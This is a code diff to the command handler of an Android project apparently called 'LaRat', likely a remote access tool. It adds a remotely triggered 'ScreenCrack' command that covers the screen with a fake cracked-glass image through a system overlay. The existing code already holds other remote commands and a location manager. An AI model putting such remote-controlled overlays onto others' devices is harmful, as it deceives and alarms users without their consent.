@@ -1,15 +1,21 @@
 package com.c4wd.command;
 
 import android.content.Context;
+import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
 import android.graphics.PixelFormat;
 import android.os.AsyncTask;
 import android.os.PowerManager;
 import android.view.Gravity;
+import android.view.ViewGroup;
 import android.view.WindowManager;
+import android.widget.ImageView;
 import android.widget.Toast;
 
 import com.c4wd.larat.LaRatLocationManager;
+import com.c4wd.larat.R;
 import com.larat.drawing.BouncingBall;;
+import java.security.acl.LastOwnerException;
 import java.util.HashMap;
 
 /**
@@ -31,6 +37,7 @@ public class Command {
         commandList.put("Toast", new ToastTask());
         commandList.put("OpenGL", new OpenGLViewTask());
         commandList.put("Pong", new OpenGLViewTask());
+        commandList.put("ScreenCrack", new CrackScreenTask());
     }
 
     public static class ScreenOnTask extends AsyncTask<Object, Void, String> {
@@ -152,6 +159,41 @@ public class Command {
             BouncingBall view = new BouncingBall(context.getContext());
             view.maxX = windowManager.getDefaultDisplay().getWidth();
             view.maxY = windowManager.getDefaultDisplay().getHeight();
+
+            windowManager.addView(view, params);
+        }
+
+    }
+
+    public static class CrackScreenTask extends AsyncTask<Object, Void, Void> {
+
+        private CommandContext context;
+
+        @Override
+        protected Void doInBackground(Object... objects) {
+            this.context = (CommandContext)(objects[0]);
+            return null;
+        }
+
+        @Override
+        protected void onPostExecute(Void returnValue) {
+            WindowManager windowManager = (WindowManager) this.context.getContext().getSystemService(Context.WINDOW_SERVICE);
+
+            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
+                    WindowManager.LayoutParams.WRAP_CONTENT,
+                    WindowManager.LayoutParams.WRAP_CONTENT,
+                    WindowManager.LayoutParams.TYPE_PHONE,
+                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
+                    PixelFormat.TRANSLUCENT);
+
+            params.gravity = Gravity.CENTER;
+            params.x = 0;
+            params.y = 0;
+
+            ImageView view = new ImageView(context.getContext());
+            Bitmap bm = BitmapFactory.decodeResource(context.getContext().getResources(), R.drawable.crack);
+            view.setImageBitmap(bm);
+            view.setLayoutParams(new ViewGroup.LayoutParams(100, 100));
 
             windowManager.addView(view, params);
         }
